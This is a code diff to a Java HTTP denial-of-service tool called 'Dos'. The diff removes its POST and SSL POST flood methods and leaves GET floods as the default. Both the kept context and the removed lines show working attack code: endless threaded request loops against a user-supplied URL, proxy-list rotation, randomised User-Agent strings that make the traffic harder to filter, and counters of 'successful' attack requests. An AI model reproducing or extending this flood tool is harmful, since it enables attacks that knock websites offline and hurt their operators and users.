@@ -19,7 +19,7 @@ public class Dos implements Runnable {
     private static int successfulRequests = 0;
     private static int failedRequests = 0;
     private static List<Proxy> proxyList = new ArrayList<>();
-    
+
     int seq;
     int type;
 
@@ -48,10 +48,8 @@ public class Dos implements Runnable {
         String amountStr = in.nextLine();
         Dos.amount = (amountStr == null || amountStr.equals("")) ? 99999 : Integer.parseInt(amountStr);
 
-        // User Input for Method
-        System.out.print("Method (GET/POST) => ");
-        String option = in.nextLine();
-        int ioption = option.equalsIgnoreCase("GET") ? (url.startsWith("http://") ? 3 : 4) : (url.startsWith("http://") ? 1 : 2);
+        // Default to GET method
+        int ioption = url.startsWith("http://") ? 3 : 4;
 
         // User Input for Proxy List
         System.out.print("Do you want to add a proxy list (yes/no)? ");
@@ -82,7 +80,7 @@ public class Dos implements Runnable {
             // Wait for all threads to finish
         }
         System.out.println("Main Thread ended");
-        
+
         // Save Log
         saveLog();
 
@@ -150,23 +148,6 @@ public class Dos implements Runnable {
         Dos.url = url;
     }
 
-    private void postAttack(String url) throws Exception {
-        URL obj = new URL(url);
-        HttpURLConnection con = createHttpURLConnection(obj);
-        con.setRequestMethod("POST");
-        con.setRequestProperty("User-Agent", USER_AGENT);
-        con.setRequestProperty("Accept-Language", "en-US,en;");
-        String urlParameters = "out of memory";
-
-        con.setDoOutput(true);
-        DataOutputStream wr = new DataOutputStream(con.getOutputStream());
-        wr.writeBytes(urlParameters);
-        wr.flush();
-        wr.close();
-        int responseCode = con.getResponseCode();
-        printStatus(responseCode, "POST attack done! Thread: " + this.seq);
-    }
-
     private void getAttack(String url) throws Exception {
         URL obj = new URL(url);
         HttpURLConnection con = createHttpURLConnection(obj);
@@ -175,23 +156,6 @@ public class Dos implements Runnable {
 
         int responseCode = con.getResponseCode();
         printStatus(responseCode, "GET attack done! Thread: " + this.seq);
-    }
-
-    private void sslPostAttack(String url) throws Exception {
-        URL obj = new URL(url);
-        HttpsURLConnection con = createHttpsURLConnection(obj);
-        con.setRequestMethod("POST");
-        con.setRequestProperty("User-Agent", USER_AGENT);
-        con.setRequestProperty("Accept-Language", "en-US,en;");
-        String urlParameters = "out of memory";
-
-        con.setDoOutput(true);
-        DataOutputStream wr = new DataOutputStream(con.getOutputStream());
-        wr.writeBytes(urlParameters);
-        wr.flush();
-        wr.close();
-        int responseCode = con.getResponseCode();
-        printStatus(responseCode, "SSL POST attack done! Thread: " + this.seq);
     }
 
     private void sslGetAttack(String url) throws Exception {
@@ -232,7 +196,7 @@ public class Dos implements Runnable {
             System.out.println(GREEN + message + RESET);
         } else {
             failedRequests++;
-            System.out.println(RED +  + " (Response Code: " + responseCode + ")" + RESET);
+            System.out.println(RED + " (Response Code: " + responseCode + ")" + RESET);
         }
     }
 
@@ -263,12 +227,6 @@ public class Dos implements Runnable {
         try {
             while (true) {
                 switch (this.type) {
-                    case 1:
-                        postAttack(Dos.url);
-                        break;
-                    case 2:
-                        sslPostAttack(Dos.url);
-                        break;
                     case 3:
                         getAttack(Dos.url);
                         break;
@@ -289,8 +247,7 @@ public class Dos implements Runnable {
         // Example methods, should be customized as necessary
         // 1. Randomizing User-Agents
         String[] userAgents = {
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
-            "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3","Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
             "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
         };
 
